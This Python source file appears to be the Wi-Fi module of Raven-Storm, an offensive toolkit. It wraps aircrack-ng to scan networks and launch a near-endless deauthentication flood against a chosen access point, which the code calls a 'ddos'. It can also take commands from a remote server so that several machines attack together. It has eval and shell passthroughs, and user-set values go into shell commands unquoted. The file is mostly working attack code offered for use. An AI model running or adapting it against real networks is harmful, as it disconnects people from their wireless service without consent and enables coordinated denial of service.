"""
The Raven-Storm Toolkit - WIFI Module
-------------------------------------
Programmed and developed by Taguar258
Published under the MIT License
Based on the CLIF-Framework by Taguar258
"""

import os
import requests
from threading import Thread
from time import sleep
from CLIF_Framework.framework import event, tools

try:
    from os import geteuid
    geteuid_exists = True
except ImportError:
    geteuid_exists = False

event = event()
tools = tools()

class WifiModule:
    def __init__(self, console):
        """
        Initialize the WIFI module for Raven-Storm.
        """
        global var
        var = console  # noqa: VNE002

        self._add_commands()

        # Colors
        var.C_None = "\x1b[0;39m"
        var.C_Bold = "\x1b[1;39m"
        var.C_Green = "\x1b[32m"
        var.C_Violet = "\x1b[34m"
        var.C_Dark_Blue = "\x1b[35m"
        var.C_Red = "\x1b[31m"

        # Default values
        var.interface = "wlan0"
        var.essid = ""
        var.bssid = ""
        var.mon = "mon0"
        var.channel = 11
        var.threads = 2
        var.wifi_debug = False

    def _add_commands(self):
        """
        Add commands to the event handler.
        """
        event.commands(self.exit_console, ["exit", "quit", "e", "q"])
        event.commands(self.show_values, ["values", "ls"])
        event.command(self.help)

        event.commands(self.run_shell, ".")
        event.commands(self.debug, "$")

        event.help(["values", "ls"], "Show all options.")
        event.help("scan", "Scan for wifi networks.")
        event.help("channel", "Set the channel.")
        event.help("bssid", "Set the target's BSSID address.")
        event.help("essid", "Set the target's ESSID name.")
        event.help("mon", "Set your own monitor interface.")
        event.help("interface", "Set the interface you would like to use.")
        event.help("threads", "Set the number of threads to use.")
        event.help("run", "Run the stress test.")

    def banner(self):
        """
        Display the banner for the WIFI module.
        """
        os.system("clear || cls")

        # Check if required tools are installed
        if "/" not in os.popen("command -v airmon-ng").read() or \
           "/" not in os.popen("command -v airodump-ng").read() or \
           "/" not in os.popen("command -v aireplay-ng").read():
            input("\n[i] Please install aircrack-ng to continue.\n[Press Enter to continue]")
            os.system("clear || cls")
            var.stop()
            return

        # Check if running with sudo privileges
        if geteuid_exists:
            if geteuid() != 0:
                input("\n[i] Please run with sudo privileges.\n[Press Enter to continue]")
                os.system("clear || cls")
                var.stop()
                return

        # Display disclaimer
        print(("""C_B----------------------------------------------------------C_W
THE CREATOR DOES NOT TAKE ANY RESPONSIBILITY FOR DAMAGE CAUSED.
THE USER ALONE IS RESPONSIBLE, BE IT: ABUSING RAVEN-STORM
TO FIT ILLEGAL PURPOSES OR ACCIDENTAL DAMAGE CAUSED BY RAVEN-STORM.
BY USING THIS SOFTWARE, YOU MUST AGREE TO TAKE FULL RESPONSIBILITY
FOR ANY DAMAGE CAUSED BY RAVEN-STORM.
EVERY ATTACK WILL CAUSE TEMPORARY DAMAGE, BUT LONG-TERM DAMAGE IS
DEFFINITIFLY POSSIBLE.
RAVEN-STORM SHOULD NOT SUGGEST PEOPLE TO PERFORM ILLEGAL ACTIVITIES.
C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
        self.help()

    def exit_console(self):
        """
        Exit the console.
        """
        print("Have a nice day.")
        quit()

    def run_shell(self, command):
        """
        Run a shell command.
        """
        print("")
        os.system(tools.arg("Enter shell command: ", ". ", command))
        print("")

    def debug(self, command):
        """
        Run a debug command.
        """
        print("")
        eval(tools.arg("Enter debug command: ", "$ ", command))
        print("")

    @event.command
    def clear():
        """
        Clear the console screen.
        """
        os.system("clear || cls")

    @event.event
    def on_ready():
        """
        Event triggered when the console is ready.
        """
        WifiModule(event).banner()

    @event.event
    def on_command_not_found(command):
        """
        Event triggered when a command is not found.
        """
        print("")
        print("The command you entered does not exist.")
        print("")

    def check_session(self):
        """
        Check if there is a session to load commands from.
        """
        if var.session[1][0] and len(var.session[1][1]) >= 1:
            if len(var.session[1][1][0]) >= 1:
                run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
                var.session[1][1][0] = var.session[1][1][0][1:]
            else:
                var.session[1][1] = var.session[1][1][1:]
                run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
                var.session[1][1][0] = var.session[1][1][0][1:]
            var.run_command = run_following

    @event.event
    def on_input():
        """
        Event triggered when input is received.
        """
        WifiModule(event).check_session()
        if var.server[0] and not var.server[1]:
            while True:
                data = requests.post((var.server[2] + ("get/com%s" % var.server[4])), data={"password": var.server[3]}).text
                if data != "500":
                    var.server[4] = var.server[4] + 1
                    var.run_command = [data, data]
                    print(var.ps1 + "\r")
                    break
                else:
                    sleep(1)

    @event.event
    def on_interrupt():
        """
        Event triggered on interrupt (Ctrl+C).
        """
        print("")
        var.stop()

    @event.event
    def on_command(command):
        """
        Event triggered when a command is executed.
        """
        if var.session[0][0]:
            var.session[0][1].write(command + "\n")
        if var.server[0] and var.server[1]:
            status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
            if status != "200":
                print("")
                print("An error occurred while sending commands to the server.")
                print("")

    @event.command
    def debug():
        """
        Enable debug mode.
        """
        var.wifi_debug = True
        print("")
        print("Debugging mode enabled.")
        print("")

    def show_values(self):
        """
        Display current configuration values.
        """
        print("")
        print("Interface: %s" % var.interface)
        print("ESSID: %s" % var.essid)
        print("BSSID: %s" % var.bssid)
        print("MON: %s" % var.mon)
        print("Channel: %s" % var.channel)
        print("Threads: %s" % var.threads)
        print("")

    @event.help
    def help():
        """
        Display help messages.
        """
        event.help_title("\x1b[1;39mWIFI Help:\x1b[0;39m")
        tools.help("|-- ", " :: ", event)
        print("")

    @event.command
    def bssid(command):
        """
        Set BSSID command handler.
        """
        print("")
        try:
            var.bssid = tools.arg("BSSID: ", "bssid ", command)
        except Exception as e:
            print(f"There was an error while executing: {e}")
        print("")

    @event.command
    def interface(command):
        """
        Set interface command handler.
        """
        print("")
        try:
            var.interface = tools.arg("Interface: ", "interface ", command)
        except Exception as e:
            print(f"There was an error while executing: {e}")
        print("")

    @event.command
    def essid(command):
        """
        Set ESSID command handler.
        """
        print("")
        try:
            var.essid = tools.arg("ESSID: ", "essid ", command)
        except Exception as e:
            print(f"There was an error while executing: {e}")
        print("")

    @event.command
    def mon(command):
        """
        Set MON command handler.
        """
        print("")
        try:
            var.mon = tools.arg("MON: ", "mon ", command)
        except Exception as e:
            print(f"There was an error while executing: {e}")
        print("")

    @event.command
    def channel(command):
        """
        Set channel command handler.
        """
        print(" ")
        try:
            var.channel = int(tools.arg("Channel: ", "channel ", command))
        except ValueError as e:
            print(f"There was an error while executing: {e}")
        print(" ")

    @event.command
    def threads(command):
        """
        Set threads command handler.
        """
        print(" ")
        try:
            var.threads = int(tools.arg("Threads: ", "threads ", command))
        except ValueError as e:
            print(f"There was an error while executing: {e}")
        print(" ")

    @event.command
    def scan():
        """
        Scan for wifi networks.
        """
        print("")
        try:
            os.system("sudo airmon-ng check kill")
            sleep(1)
            os.system("sudo airmon-ng start %s" % var.interface)
            sleep(3)
            os.system("sudo airodump-ng %s &" % var.mon)
        except Exception as ex:
            var.command_log.append(f"ERROR: {ex}")
            print(f"ERROR: {ex}")
        print("")

    def ddos(self):
        """
        Perform deauthentication attack.
        """
        os.system("sudo aireplay-ng --deauth 9999999999999 -o 1 -a %s -e %s %s & " % (var.bssid, var.essid, var.mon))

    def dump(self):
        """
        Perform wifi dump.
        """
        os.system("sudo airodump-ng -c %s --bssid %s %s & " % (var.channel, var.bssid, var.mon))

    @event.command
    def run():
        """
        Run the stress test.
        """
        def execute():
            print("")
            print("To stop the attack press: ENTER or CTRL + C")
            print("")

            var.ps1 = ""  # Change due to threading bug.

            sleep(3)
            try:
                t = Thread(target=WifiModule(var).dump)
                t.start()
            except Exception:
                print("Could not start thread.")
            sleep(2)
            for thread in range(var.threads):
                try:
                    t = Thread(target=WifiModule(var).ddos)
                    t.start()
                except Exception:
                    print(f"Could not start thread {thread}.")

            def reset_attack():
                print("Stopping threads...")
                os.system("sudo killall airplay-ng")
                os.system("sudo airmon-ng stop %s" % var.interface)
                os.system("sudo ifconfig %s up" % var.interface)
                os.system("sudo service restart NetworkManager")
                if var.wifi_debug:
                    print("Saving debugging log...")
                    output_to = os.path.join(os.getcwd(), "wifi_debug_log.txt")

                    write_method = "a"
                    if os.path.isfile(output_to):
                        write_method = "a"
                    else:
                        write_method = "w"

                    output_file = open(output_to, write_method)
                    if write_method == "a":
                        output_file.write("------------- New Log -------------")
                    output_file.write(str(os.name + "\n"))
                    output_file.write(str(version + "\n"))
                    output_file.write(str("\n".join(var.command_log)))
                    output_file.close()
                print("Done.")
                quit()

            def check_stopped_execution():
                while True:
                    data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
                    if data != "True":
                        reset_attack()
                        break
                    else:
                        sleep(1)
            
            try:
                if var.server[0] and var.server[0]:
                    rec_t = Thread(target=check_stopped_execution)
                    rec_t.start()
                input("\r")
            except KeyboardInterrupt:
                pass

            if var.server[0] and var.server[1]:
                status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
                if status != "200":
                    print("An error occurred while sending data to the server.")

            reset_attack()

        if var.server[0] and not var.server[1]:
            while True:
                data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
                if data == "True":
                    execute()
                    break
                else:
                    sleep(1)
        elif not tools.question("\nDo you agree to the terms of use?"):
            print("Agreement not accepted.")
            quit()
        else:
            if var.server[0] and var.server[1]:
                if tools.question("\nWould you like to use the host as part of the ddos?"):
                    status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
                    if status != "200":
                        print("An error occurred while sending data to the server.")
                    execute()
                else:
                    status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
                    if status != "200":
                        print("An error occurred while sending data to the server.")
                    try:
                        print("[Press Enter to stop the attack.]")
                    except KeyboardInterrupt:
                        pass
                    status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
                    if status != "200":
                        print("An error occurred while sending data to the server.")
            else:
                execute()


def setup(console):
    """
    Setup the WIFI module for Raven-Storm.
    """
    console.ps1 = "WIFI> "
    console.add(WifiModule(console), event)
